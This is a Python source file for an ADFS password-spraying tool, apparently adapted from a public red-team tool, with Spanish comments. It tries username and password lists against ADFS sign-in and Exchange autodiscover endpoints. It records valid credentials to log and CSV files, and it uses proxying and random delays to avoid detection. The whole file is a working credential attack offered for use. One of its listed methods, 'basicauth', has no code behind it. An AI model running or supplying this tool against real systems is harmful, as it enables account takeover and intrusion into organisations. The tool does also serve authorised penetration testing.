# ADFS Password Spraying Tool - Professional Edition
# Features: Burp/Proxy Support, Domain Prepending, Multi-Method
# by @xFreed0m & HackerAI

import argparse
import csv
import datetime
import logging
import sys
import time
import urllib.parse
from random import randint

import requests
import urllib3
from colorlog import ColoredFormatter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth

# Silenciar advertencias de certificados (útil para Burp)
urllib3.disable_warnings(InsecureRequestWarning)

def logo():
    print("""
        ___    ____  ___________
       /   |  / __ \/ ____/ ___/____  _________ ___  __
      / /| | / / / / /_   \__ \/ __ \/ ___/ __ `/ / / /
     / ___ |/ /_/ / __/  ___/ / /_/ / /  / /_/ / /_/ /
    /_/  |_/_____/_/    /____/ .___/_/   \__,_/\__, /
                            /_/               /____/
    
    By @x_Freed0m (Updated for Burp Support)
    """)
def args_parse():
    parser = argparse.ArgumentParser(description="ADFS Password Spraying Tool")
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument('-U', '--userlist', help="Lista de usuarios")
    user_group.add_argument('-u', '--user', help="Usuario único")
    
    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument('-P', '--passwordlist', help="Lista de contraseñas")
    pass_group.add_argument('-p', '--password', help="Password única")
    
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-T', '--targetlist', help="Lista de targets")
    target_group.add_argument('-t', '--target', help="URL target")

    parser.add_argument('-d', '--domain', help="Dominio (ej: CONTOSO)", default=None)
    parser.add_argument('-x', '--proxy', help="Proxy (ej: http://127.0.0.1:8080)", default=None)
    
    sleep_group = parser.add_mutually_exclusive_group()
    sleep_group.add_argument('-s', '--sleep', type=float, help="Espera fija", default=0)
    sleep_group.add_argument('-r', '--random', nargs=2, type=float, metavar=('min', 'max'), help="Espera random")
    
    parser.add_argument('-o', '--output', help="Nombre base para archivos de salida", default="ADFSSpray_Results")
    parser.add_argument('method', choices=['adfs', 'autodiscover', 'basicauth'])
    parser.add_argument('-V', '--verbose', help="Ver intentos fallidos (en azul)", action="store_true")

    return parser.parse_args()

def configure_logger(verbose):
    global LOGGER
    LOGGER = logging.getLogger("ADFSpray")
    LOGGER.setLevel(logging.DEBUG if verbose else logging.INFO)
    
    # Colores: INFO (Éxitos) en Verde, DEBUG (Fallos en Verbose) en Azul (BLUE)
    log_colors = {
        'DEBUG': 'blue',    
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'bold_red',
    }
    
    formatter = ColoredFormatter(
        "%(log_color)s[%(asctime)s] %(message)s%(reset)s",
        datefmt='%H:%M:%S',
        log_colors=log_colors
    )
    
    ch = logging.StreamHandler()
    ch.setFormatter(formatter)
    LOGGER.addHandler(ch)

def log_success(user, password, target, filename):
    """Registra los éxitos en un archivo de texto con marca de tiempo legible."""
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] SUCCESS: {user} | Password: {password} | Target: {target}\n"
    
    # Log de texto plano para humanos
    with open(f"{filename}_success.log", "a") as f:
        f.write(log_entry)
        
    # CSV para análisis de datos
    with open(f"{filename}.csv", "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, "VALID", user, password, target])

def get_session(proxy_url):
    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
        session.verify = False
    return session

def run_attack(args):
    try:
        users = [u.strip() for u in open(args.userlist)] if args.userlist else [args.user]
        passwords = [p.strip() for p in open(args.passwordlist)] if args.passwordlist else [args.password]
        targets = [t.strip().rstrip('/') for t in open(args.targetlist)] if args.targetlist else [args.target.rstrip('/')]
    except Exception as e:
        LOGGER.critical(f"Error al cargar archivos: {e}")
        return

    LOGGER.info(f"Iniciando spray técnico... Usuarios: {len(users)} | Passwords: {len(passwords)}")
    if args.proxy: LOGGER.info(f"Túnel de interceptación activo: {args.proxy}")

    for target in targets:
        for password in passwords:
            for user in users:
                full_user = f"{args.domain}\\{user}" if args.domain else user
                try:
                    session = get_session(args.proxy)
                    success = False
                    
                    if args.method == 'adfs':
                        # El short_user va en la URL, el full_user (con dominio) en el cuerpo POST
                        url = f"{target}/adfs/ls/?wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&username={user}"
                        data = {'UserName': full_user, 'Password': password, 'AuthMethod': 'FormsAuthentication'}
                        r = session.post(url, data=data, allow_redirects=False, timeout=12)
                        success = (r.status_code == 302)
                    
                    elif args.method == 'autodiscover':
                        url = f"{target}/autodiscover/autodiscover.xml"
                        r = session.get(url, auth=HttpNtlmAuth(full_user, password), timeout=12)
                        success = (r.status_code == 200)

                    if success:
                        LOGGER.info(f"[+] ÉXITO IDENTIFICADO: {full_user}")
                        log_success(full_user, password, target, args.output)
                    elif args.verbose:
                        LOGGER.critical(f"[-] Intento fallido: {full_user}")
                
                except Exception as e:
                    LOGGER.critical(f"[!] Error de red/timeout: {str(e)[:60]}...")

                # Gestión del sigilo temporal
                wait = randint(int(args.random[0]), int(args.random[1])) if args.random else args.sleep
                if wait > 0: time.sleep(wait)

    LOGGER.info("Ciclo de password spraying finalizado.")

def main():
    logo()
    args = args_parse()
    configure_logger(args.verbose)
    run_attack(args)

if __name__ == "__main__":
    main()
